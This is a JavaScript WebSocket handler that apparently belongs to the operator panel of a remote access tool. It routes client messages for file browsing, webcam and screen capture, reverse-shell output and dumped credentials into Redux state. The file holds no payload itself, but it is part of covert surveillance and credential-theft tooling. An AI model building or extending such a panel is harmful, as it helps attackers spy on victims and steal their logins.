import {disconnectClient, selectClientByUUID, setClients, setFileToDownload} from "@redux/slices/clientSlice";
import {setDirectoryData, setDisks, updateProgressBar} from "@redux/slices/fileManagerSlice";
import {setWebcamDevices, setWebcamFrame} from "@redux/slices/webcamManagerSlice";
import {setOriginalDimensions, setScreenFrame, setScreens} from "@redux/slices/screenManagerSlice";
import {setCommandResponse} from "@redux/slices/revereShellSlice";
import {setCredentials} from "@redux/slices/credentialsManagerSlice";

export const handleWebSocketMessage = (store, data) => {
    console.log("Received message")
    console.log(data)
    if (data.RESPONSE === "TABLE_INFO") {
        store.dispatch(setClients(data.content));
    } else if (data.RESPONSE === "CLIENT_SET"){
        store.dispatch(selectClientByUUID(data));
    } else if (data.RESPONSE === "SYS_NET_INFO"){
        store.dispatch(setClients([data]));
    } else if (data.RESPONSE === "DISKS") {
        store.dispatch(setDisks(data.disks));
        if (data.firstDiskDirectory) {
            store.dispatch(setDirectoryData(data.firstDiskDirectory));
        }
    } else if (data.RESPONSE === "DIRECTORY") {
        store.dispatch(setDirectoryData(data.directory));
    } else if (data.RESPONSE === "PROGRESS_BAR"){
        store.dispatch(updateProgressBar(data));
    } else if (data.RESPONSE === "WEBCAM_DEVICES"){
        store.dispatch(setWebcamDevices(data))
    } else if (data.RESPONSE === "MONITORS"){
        store.dispatch(setScreens(data));
    } else if (data.RESPONSE === "SCREEN_DIMENSIONS"){
        store.dispatch(setOriginalDimensions(data));
    } else if (data.RESPONSE === "SHELL"){
        store.dispatch(setCommandResponse(data));
    } else if (data.RESPONSE ===  "DUMP_CREDENTIALS"){
        store.dispatch(setCredentials(data));
    } else if (data.RESPONSE === "CPP_CLIENT_CONNECTION_LOST"){
        store.dispatch(disconnectClient(data));
    } else if (data.RESPONSE === "SHOW_DOWNLOADED"){
        store.dispatch(setFileToDownload(data));
    }
};

export const handleWebSocketBinary = (store, data) => {
    const reader = new FileReader();
    reader.readAsArrayBuffer(data);
    reader.onload = function(event) {
        const byteArray = new Uint8Array(event.target.result);
        const distinctionByte = byteArray[0];
        const actualData = byteArray.slice(1);
        if (distinctionByte === 0){
            store.dispatch(setWebcamFrame(actualData.buffer));
        } else if (distinctionByte === 1){
            store.dispatch(setScreenFrame(actualData.buffer));
        }
    };
};

